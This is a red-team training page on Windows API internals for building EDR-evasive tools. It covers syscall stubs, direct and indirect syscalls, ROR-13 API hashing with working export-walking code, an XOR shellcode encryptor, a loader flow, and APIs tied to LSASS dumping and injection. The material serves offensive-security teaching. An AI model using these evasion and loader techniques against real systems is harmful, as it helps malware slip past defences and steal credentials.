---
layout: training-page
title: "Windows API Concepts for Red Team — Red Team Academy"
module: "Tool Development"
tags:
  - windows-api
  - syscalls
  - ntdll
  - api-hashing
  - ordinals
  - edr-evasion
  - c-plus-plus
  - malapi
page_key: "tooldev-windows-api-concepts"
render_with_liquid: false
---

# Windows API Concepts for Red Team

## Overview

The Windows API (WinAPI) is the collection of functions exposed by Microsoft that allows user-mode programs to interact with the operating system. Understanding its layered architecture — from high-level Win32 functions down to kernel-mode syscalls — is essential for building evasive offensive tools. This page covers the call chain, key DLLs, syscall stub anatomy, API hashing, ordinal-based resolution, and the MalAPI.io reference catalog.

## Windows API Architecture

### User Mode vs. Kernel Mode

Windows enforces a hard boundary between user-mode (Ring 3) and kernel-mode (Ring 0) code:

| | User Mode | Kernel Mode |
|---|---|---|
| **Privilege** | Limited (Ring 3) | Unrestricted (Ring 0) |
| **Memory access** | Process virtual address space only | All physical and virtual memory |
| **Crash impact** | Crashes the process only | Blue screen (BSOD) |
| **Examples** | notepad.exe, chrome.exe | ntoskrnl.exe, device drivers |

User-mode code can never directly access kernel memory or hardware. Instead, it transitions to kernel mode through **system calls**.

### API Call Chain

A typical Win32 API call passes through multiple layers before reaching the kernel:

```
Application (e.g., shellcode)
    │
    ▼
kernel32.dll / advapi32.dll    ← Win32 API (documented)
    │
    ▼
ntdll.dll  (Nt* / Zw* stubs)  ← Native API (undocumented)
    │  syscall instruction
    ▼
ntoskrnl.exe (kernel)          ← Kernel services
    │
    ▼
Hardware / drivers
```

**Why this matters for evasion:** EDRs hook functions in `ntdll.dll` — the last user-mode stop before the kernel. Bypassing `ntdll.dll` via direct or indirect syscalls removes that monitoring layer entirely.

### Key DLLs and Their Offensive Relevance

| DLL | Contains | Offensive Use |
|---|---|---|
| `kernel32.dll` | CreateProcess, VirtualAlloc, WriteProcessMemory | Process/memory manipulation — classic injection |
| `ntdll.dll` | NtAllocateVirtualMemory, NtCreateThreadEx, NtWriteVirtualMemory | Low-level native API; target for hooking/unhooking |
| `advapi32.dll` | OpenProcessToken, AdjustTokenPrivileges, RegOpenKeyEx | Token manipulation, registry, privilege escalation |
| `user32.dll` | FindWindow, SendMessage, EnumWindows | GUI enumeration, keylogging |
| `dbghelp.dll` | MiniDumpWriteDump | LSASS dumping |
| `secur32.dll` | LsaEnumerateLogonSessions, AcquireCredentialsHandle | Logon session enumeration |
| `netapi32.dll` | NetUserEnum, NetSessionEnum | Domain/local user enumeration |
| `crypt32.dll` | CryptUnprotectData | DPAPI decryption (browser passwords, Wi-Fi keys) |
| `iphlpapi.dll` | GetAdaptersInfo, GetIpNetTable | Network interface/ARP enumeration |

## Syscall Concepts

### What Is a Syscall?

A **syscall** is the mechanism for transitioning from Ring 3 to Ring 0. On x64 Windows, the `syscall` instruction triggers the transition. Each kernel service is identified by a **System Service Number (SSN)** loaded into the `EAX` register before the `syscall` executes.

```asm
; Simplified syscall stub in ntdll.dll (NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
    mov r10, rcx              ; Save 1st arg (rcx) in r10 (calling convention)
    mov eax, 18h              ; SSN for NtAllocateVirtualMemory (varies by OS version)
    syscall                   ; Transition to kernel mode
    ret
```

**SSN location:** At offset `+4` into the stub (the byte after `mov r10, rcx`).  
**Syscall instruction address:** At offset `+0x12` from the stub start.

Reading these dynamically at runtime:

```cpp
UINT_PTR pNtAlloc = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
DWORD ssn         = ((unsigned char*)(pNtAlloc + 4))[0];   // SSN
UINT_PTR sysAddr  = pNtAlloc + 0x12;                        // Address of syscall instruction
```

### Syscall Stub Prologue (Normal vs. Hooked)

EDRs inline-hook ntdll stubs by overwriting the first 5 bytes with a `JMP` to their monitoring DLL:

```
NORMAL stub:    4C 8B D1 B8 XX  →  mov r10,rcx  / mov eax,<SSN>
HOOKED stub:    E9 XX XX XX XX  →  jmp <edrhook.dll+offset>
```

Detecting this pattern (checking the first 4 bytes for `4C 8B D1 B8`) lets you identify which functions are monitored.

### Direct vs. Indirect Syscalls

| | Direct Syscall | Indirect Syscall |
|---|---|---|
| **Mechanism** | `syscall` instruction in your own code | Jump to `syscall` instruction inside `ntdll.dll` |
| **Bypasses hooks** | Yes | Yes |
| **Return address** | Points to non-ntdll memory (**detectable**) | Points inside `ntdll.dll` (**stealthy**) |
| **Detection risk** | Medium (call stack anomaly) | Low |
| **Complexity** | Low | Medium |
| **Tools** | SysWhispers2/3, HellsGate | SysWhispers3 (--indirect), RecycledGate |

For indirect syscalls, the jump target is computed as `ntdll_stub_base + 0x12` — the address of the actual `syscall` instruction inside the legitimate DLL region.

## API Hashing

### What Is API Hashing?

Instead of storing function names as readable strings (`"VirtualAlloc"`, `"CreateRemoteThread"`), a loader computes a hash of each name and searches the export table at runtime. This removes all API name strings from the binary, defeating static analysis that scans for suspicious imports.

**Benefits:**
- Avoids readable API names in the binary / IAT
- Bypasses antivirus signature detection based on string matching
- Reduces shellcode size (no stored strings)
- Compatible with position-independent shellcode (PIC)

### Common Hash Algorithms

| Algorithm | Width | Used By |
|---|---|---|
| djb2 | 32-bit | ShellMeow, various shellcodes |
| ROR-13 (Metasploit) | 32-bit | Meterpreter, CobaltStrike default |
| CRC32 | 32-bit | Various loaders |
| FNV-1a | 32/64-bit | Custom tooling |

### Implementation: Hash Computation

```cpp
// ror13_hash.cpp — Compute ROR-13 hash used by Metasploit/Cobalt Strike
#include <windows.h>
#include <iostream>
#include <string>

// ROR-13: rotate right by 13 bits, then XOR with next char
DWORD ror13(DWORD val) {
    return (val >> 13) | (val << 19);
}

DWORD hash_api(const char* name) {
    DWORD hash = 0;
    while (*name) {
        hash = ror13(hash);
        hash += (BYTE)*name++;
    }
    return hash;
}

int main() {
    const char* funcs[] = {
        "VirtualAlloc", "VirtualAllocEx", "WriteProcessMemory",
        "CreateRemoteThread", "LoadLibraryA", "GetProcAddress"
    };
    for (const char* fn : funcs) {
        printf("0x%08X  %s\n", hash_api(fn), fn);
    }
    return 0;
}
// Output example:
// 0x91AFCA54  VirtualAlloc
// 0x6B9D1148  VirtualAllocEx
```

### Implementation: Runtime API Resolution by Hash

```cpp
// hash_resolve.cpp — Resolve function pointer by walking the export table
#include <windows.h>

FARPROC GetProcByHash(HMODULE hModule, DWORD targetHash) {
    BYTE*  base  = (BYTE*)hModule;
    auto*  dos   = (IMAGE_DOS_HEADER*)base;
    auto*  nt    = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto&  expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    auto*  exp   = (IMAGE_EXPORT_DIRECTORY*)(base + expDir.VirtualAddress);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        // Compute hash of this export name
        DWORD h = 0;
        for (const char* p = name; *p; p++) {
            h = ((h >> 13) | (h << 19)) + (BYTE)*p;   // ROR-13
        }
        if (h == targetHash) {
            return (FARPROC)(base + funcs[ords[i]]);
        }
    }
    return nullptr;
}

// Usage:
// auto pVirtualAlloc = (decltype(&VirtualAlloc))
//     GetProcByHash(GetModuleHandleA("kernel32.dll"), 0x91AFCA54);
```

### XOR Shellcode Encryption + Embedded Hash Loader

A common workflow: generate shellcode → encrypt with XOR key → embed encrypted bytes + hash-resolved API calls in a single loader stub.

```cpp
// encryptor.cpp — XOR-encrypt shellcode, output as C header
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

const std::string XOR_KEY = "redteamexercises";

// Raw shellcode (replace with real payload)
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00";
const size_t   shellcode_sz = sizeof(shellcode) - 1;

void xor_crypt(std::vector<unsigned char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= (unsigned char)key[i % key.size()];
}

int main() {
    std::vector<unsigned char> enc(shellcode, shellcode + shellcode_sz);
    xor_crypt(enc, XOR_KEY);

    std::ofstream out("encrypted_shellcode.h");
    out << "#pragma once\n";
    out << "// XOR key: \"" << XOR_KEY << "\"\n";
    out << "unsigned char enc_sc[] = {";
    for (size_t i = 0; i < enc.size(); i++) {
        out << "0x" << std::hex << (int)enc[i];
        if (i != enc.size() - 1) out << ", ";
    }
    out << "};\n";
    out << "const size_t enc_sc_sz = " << std::dec << enc.size() << ";\n";

    std::cout << "[+] Encrypted shellcode → encrypted_shellcode.h\n";
    return 0;
}
```

**Loader flow:** Include `encrypted_shellcode.h`, XOR-decrypt in memory, VirtualAlloc RWX → copy → VirtualProtect RX → CreateThread / NtCreateThreadEx.

## API Ordinals

### What Are Ordinals?

Every function exported by a DLL has both a **name** (string) and an **ordinal** (integer index). You can import a function by its ordinal number instead of its name — the Windows loader resolves it by index into the export table.

```
HMODULE h = LoadLibraryA("user32.dll");
// Import by name (normal):
FARPROC pMessageBox = GetProcAddress(h, "MessageBoxA");
// Import by ordinal (stealthier):
FARPROC pMessageBox = GetProcAddress(h, (LPCSTR)2021);   // MessageBoxA ordinal in user32.dll
```

**Find ordinals with:**
```
dumpbin /exports kernel32.dll
# or:
Get-Command -Module kernel32 | Select-Object Name, @{n='Ordinal';e={$_.DllCharacteristics}}
```

### Why Ordinals Matter for Evasion

| Benefit | Detail |
|---|---|
| No string in binary | `GetProcAddress(h, (LPCSTR)123)` — no function name stored |
| Harder static analysis | IAT entry shows a number, not a readable function name |
| Faster resolution | Integer comparison vs. string comparison |

**Risk:** Ordinals can change between DLL versions. Always verify against the specific Windows version you're targeting.

### Example: Resolve by Ordinal

```cpp
// ordinal_resolve.cpp — Resolve a function by ordinal from a loaded DLL
#include <windows.h>
#include <iostream>

int main() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) return 1;

    // Cast ordinal to LPCSTR — GetProcAddress interprets low word as ordinal
    // when high word is 0 (i.e., value < 0x10000)
    FARPROC pFunc = GetProcAddress(hUser32, (LPCSTR)2021);

    if (pFunc) {
        std::cout << "[+] Resolved function at: " << (void*)pFunc << std::endl;
        // Cast and call as MessageBoxA
        typedef int (WINAPI* MsgBox_t)(HWND, LPCSTR, LPCSTR, UINT);
        ((MsgBox_t)pFunc)(NULL, "Hello via ordinal", "Test", MB_OK);
    } else {
        std::cerr << "[-] Ordinal not found\n";
    }

    FreeLibrary(hUser32);
    return 0;
}
```

**OPSEC note:** Combine ordinal resolution with manual DLL walking (bypassing `GetProcAddress` entirely) for maximum stealth.

## MalAPI.io Reference

[MalAPI.io](https://malapi.io) (by mr.d0x) catalogs Windows API functions grouped by their typical offensive uses. It is the standard reference for understanding which APIs EDRs monitor most closely.

### Key API Categories

| Category | APIs | Red Team Use |
|---|---|---|
| **Process** | OpenProcess, CreateProcess, CreateProcessW | Handle acquisition, process spawning, parent spoofing |
| **Memory** | VirtualAllocEx, WriteProcessMemory, VirtualProtect | Remote injection, shellcode staging |
| **Thread** | CreateRemoteThread, NtCreateThreadEx, QueueUserAPC | Trigger execution after injection |
| **Injection** | NtMapViewOfSection, NtUnmapViewOfSection | Process hollowing, reflective DLL mapping |
| **Evasion** | NtProtectVirtualMemory, VirtualProtectEx | RWX → RX flip to avoid IOC |
| **Anti-Debug** | IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess | Sandbox/debugger detection |
| **Credentials** | MiniDumpWriteDump, CryptUnprotectData, LsaEnumerateLogonSessions | LSASS dump, DPAPI, session theft |
| **Persistence** | RegOpenKeyEx, RegSetValueEx, CreateService | Registry run keys, service installation |
| **Network** | WinHttpOpen, InternetOpenA, WSAConnect | Staging, C2 beacon, exfil |
| **Discovery** | GetAdaptersInfo, NetUserEnum, EnumServicesStatusEx | Host recon, network mapping |
| **DLL** | LoadLibraryA, LdrLoadDll, GetProcAddress | Dynamic loading, IAT patching |

**Mapping mode:** MalAPI.io's "Mapping Mode" lets you highlight and export API tables directly, useful for documenting which APIs a malware sample uses.

### High-Detection-Risk APIs

These specific combinations reliably trigger EDR behavioral alerts:

| Sequence | Detection Signal |
|---|---|
| VirtualAllocEx → WriteProcessMemory → CreateRemoteThread | Classic remote injection triad |
| OpenProcess(PROCESS_ALL_ACCESS, lsass) | LSASS handle acquisition |
| MiniDumpWriteDump on lsass handle | LSASS dump |
| CreateProcess(CREATE_SUSPENDED) → VirtualAllocEx → SetThreadContext | Process hollowing |
| LoadLibraryA from temp/user-writable path | Suspicious DLL load |

Replace these patterns with `Nt*` native calls + indirect syscalls to reduce detection surface.

## Resources

- Windows API for Red Team - Introduction (course material)
- MalAPI.io — `malapi.io` — Windows API reference categorized by offensive use
- Microsoft MSDN — official Win32 API documentation
- SysWhispers3 — syscall header generator — `github.com/klezVirus/SysWhispers3`
- Hell's Gate — dynamic SSN resolution — `github.com/vxunderground/VXUG-Papers`
- Sektor7 — "Malware Development Essentials" course
- VirtualAllocEx (RedOps) — Direct vs Indirect Syscalls — `github.com/VirtualAllocEx`
